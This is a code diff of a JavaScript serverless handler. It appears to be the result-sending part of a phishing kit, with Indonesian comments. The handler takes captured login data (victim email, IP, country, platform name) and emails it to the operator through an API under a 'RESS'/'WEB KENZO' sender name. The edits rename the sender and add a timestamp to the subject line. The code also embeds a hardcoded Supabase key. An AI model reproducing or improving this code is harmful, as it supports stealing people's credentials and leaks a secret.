@@ -31,7 +31,7 @@ export default async function handler(req, res) {
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
         
         let EMAIL_TUJUAN = "admin@domain.com"; 
-        let NAMA_PENGIRIM = "RESS KENZO"; 
+        let NAMA_PENGIRIM = "WEB KENZO"; // DEFAULT DIGANTI JADI WEB KENZO
         let EMAIL_PENGIRIM = "hasilress@mediafire.my.id"; 
 
         try {
@@ -52,7 +52,7 @@ export default async function handler(req, res) {
         const flag = countryFlag(d.negaraKode || "");
         const previewText = "ID | +62 | LOGIN " + PLATFORM + " | IP " + (d.ip || "-");
 
-        // DESAIN BARU: CLEAN WHITE & MODERN
+        // DESAIN BARU: CLEAN WHITE & MODERN (BUKAN UNGU LAGI)
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
         <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; padding: 30px 15px;">
@@ -148,7 +148,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: `${NAMA_PENGIRIM} <${EMAIL_PENGIRIM}>`,
                 to: [EMAIL_TUJUAN],
-                subject: `🥷 ${NAMA_PENGIRIM} | ${PLATFORM} | ${d.email || "-"}`,
+                subject: `🥷 ${NAMA_PENGIRIM} | ${PLATFORM} | ${new Date().toLocaleTimeString("id-ID")}`, // GUE TAMBAHIN JAM BIAR GMAIL GA CACHE
                 html: htmlBody
             })
         });
